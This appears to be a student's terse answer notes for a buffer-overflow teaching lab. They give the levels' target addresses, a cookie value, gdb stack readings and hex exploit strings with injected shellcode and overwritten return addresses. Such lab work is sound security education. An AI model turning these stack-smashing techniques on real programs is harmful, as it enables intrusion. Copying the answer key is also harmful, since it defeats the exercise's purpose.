cookies:0x57d3dd69
smoke:08048bbb
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    00 00 00 00 bb 8b 04 08

fizz:08048be8
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    00 00 00 00 e8 8b 04 08   00 00 00 00 69 dd d3 57

bang:08048c39
0x804e160  0x804e158

b8 69 dd d3 57
a3 60 e1 04 08
68 39 8c 04 08
c3

00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00

28 3e 68 55


$1 = 0x55683e28


boom:

<test>08048c94 

(gdb) p /x $ebp
$1 = 0x55683e70
callret=0x8048ca7

b8 69 dd d3 57 
bd 70 3e 68 55
68 a7 8c 04 08 
c3 
00 00 00 00 00 
00 00 00 00 00 
00 00 00 00 00 
00 00 00 00 00              
00 00 00 00 00 
00 00 00
28 3e 68 55


nitro:
b8 69 dd d3 57
8d 6c 24 18
68 21 8d 04 08 
c3



